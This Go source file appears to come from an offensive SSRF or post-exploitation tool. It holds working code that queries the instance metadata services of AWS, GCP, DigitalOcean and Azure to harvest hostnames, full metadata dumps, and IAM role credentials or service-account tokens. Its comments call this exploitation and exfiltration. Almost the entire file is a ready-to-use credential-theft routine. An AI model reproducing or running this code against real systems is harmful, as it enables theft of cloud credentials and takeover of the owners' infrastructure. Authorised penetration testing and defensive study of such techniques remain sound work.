package sneak

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"time"
)

// All cloud metadata endpoints we support to perform SSRF against
type MetadataEndpoints map[string]*CloudSsrf

// Exfiltrated information that we can use for post-exploitation
type SsrfResults map[string]string

type CloudSsrf struct {
	// HTTP client to interact with endpoints
	Client *http.Client

	// URLs exposed by internal VPC for SSRF checks
	Endpoint []string

	// Endpoint to ping first to validate cloud provider
	Litmus string

	// Will be populated by `CheckLitmus` with the actual URL we can use
	Actual string

	// Headers we may need to set (this is mainly for GCP)
	Headers *map[string]string

	// API paths to hit to recover sensitive information
	Paths map[string]string

	// Callback to consume the current check being done and process it from the response
	PostProcessor func(check string, url string, resp *http.Response) (string, error)
}

// Checks if the endpoint for the provider is reachable, in order to confirm that
// the service actually is being hosted by the provider
func (c *CloudSsrf) CheckLitmus() bool {

	// check if each specified URL + endpoint is reachable
	for _, endpoint := range c.Endpoint {
		req, err := http.NewRequest("GET", endpoint+c.Litmus, nil)
		if err != nil {
			continue
		}

		if c.Headers != nil {
			for key, value := range *c.Headers {
				req.Header.Add(key, value)
			}
		}

		resp, err := c.Client.Do(req)
		if err != nil {
			continue
		}

		// must get a 200 status to be reachable/exploitable
		// TODO: validate if this is true for all providers
		if resp.StatusCode == 200 {
			c.Actual = endpoint
			return true
		}
	}
	return false
}

// Once it's confirmed that we can reach the endpoint let's exfiltrate
func (c *CloudSsrf) Exploit() SsrfResults {
	results := SsrfResults{}

	// to remain reliable, if a check fails, we'll log and skip
	for check, endpoint := range c.Paths {
		fmt.Printf("Running `%s`\n", check)

		url := c.Actual + endpoint
		req, err := http.NewRequest("GET", url, nil)
		if err != nil {
			continue
		}

		if c.Headers != nil {
			for key, value := range *c.Headers {
				req.Header.Add(key, value)
			}
		}

		// execute and prepare to parse response
		resp, err := c.Client.Do(req)
		if err != nil {
			continue
		}
		if resp.StatusCode != 200 {
			continue
		}

		// given each key, perform any post-processing on the data, such as
		// reaching out to an additional endpoint to recover data
		info, err := c.PostProcessor(check, url, resp)
		if err != nil {
			continue
		}

		results[check] = info
	}
	return results
}

func DefaultPostProcessor(check string, url string, resp *http.Response) (string, error) {
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(body), nil
}

func GetMetadataEndpoints() MetadataEndpoints {
	// we should get an immediate response on every request, don't waste time
	client := http.Client{
		Timeout: time.Duration(2 * time.Second),
	}
	return map[string]*CloudSsrf{

		// TODO: deal with aws_imdsv2
		"aws": &CloudSsrf{
			Client:   &client,
			Endpoint: []string{"http://169.254.169.254"},
			Litmus:   "/latest/",
			Headers:  nil,
			Paths: map[string]string{
				"hostname":   "/latest/meta-data/hostname",
				"ami-id":     "/latest/meta-data/ami-id",
				"meta_token": "/latest/meta-data/iam/security-credentials/",
				"user_token": "/latest/user-data/iam/security-credentials/",
			},
			PostProcessor: func(check string, url string, resp *http.Response) (string, error) {
				body, err := ioutil.ReadAll(resp.Body)
				if err != nil {
					return "", err
				}

				// we need to determine what roles are available and then make an additional request
				if check == "meta_token" || check == "user_token" {

					// new request to now retrieve sensitive credentials
					url := url + string(body)
					fmt.Println(url)
					req, err := http.NewRequest("GET", url, nil)
					if err != nil {
						return "", err
					}

					tokenResp, err := client.Do(req)
					if err != nil {
						fmt.Println("Request to service failed")
						return "", err
					}

					// stringify the AWS IAM credentials we retrieved and return
					tokens, err := ioutil.ReadAll(tokenResp.Body)
					if err != nil {
						return "", err
					}
					return string(tokens), nil
				}

				// just return the body as a string for everything else
				return string(body), nil
			},
		},
		"gcp": &CloudSsrf{
			Client:   &client,
			Endpoint: []string{"http://169.254.169.254", "http://metadata.google.internal"},
			Litmus:   "/computeMetadata/",
			Headers: &map[string]string{
				"Metadata-Flavor":           "Google",
				"X-Google-Metadata-Request": "True",
			},
			Paths: map[string]string{
				// GCP has a convenient parameter that dumps everything, so we don't multiple requests
				"all": "/computeMetadata/v1/?recursive=True",

				// TODO: is `default` always going to be the case for service accounts?
				"token": "/computeMetadata/v1/instance/service-accounts/default/token",
			},
			PostProcessor: func(check string, url string, resp *http.Response) (string, error) {
				body, err := ioutil.ReadAll(resp.Body)
				if err != nil {
					return "", err
				}
				return string(body), nil
			},
		},
		"do": &CloudSsrf{
			Client:   &client,
			Endpoint: []string{"http://169.254.169.254"},
			Litmus:   "/metadata/v1/",
			Paths: map[string]string{
				"all": "/metadata/v1.json",
			},
			PostProcessor: func(check string, url string, resp *http.Response) (string, error) {
				return DefaultPostProcessor(check, url, resp)
			},
		},
		"azure": &CloudSsrf{
			Client:   &client,
			Endpoint: []string{"http://169.254.169.254"},
			Litmus:   "/metadata/",
			Headers: &map[string]string{
				"Metadata": "True",
			},
			Paths: map[string]string{
				"all": "/metadata/instance?api-version=2017-04-02",
			},
			PostProcessor: func(check string, url string, resp *http.Response) (string, error) {
				return DefaultPostProcessor(check, url, resp)
			},
		},
	}
}
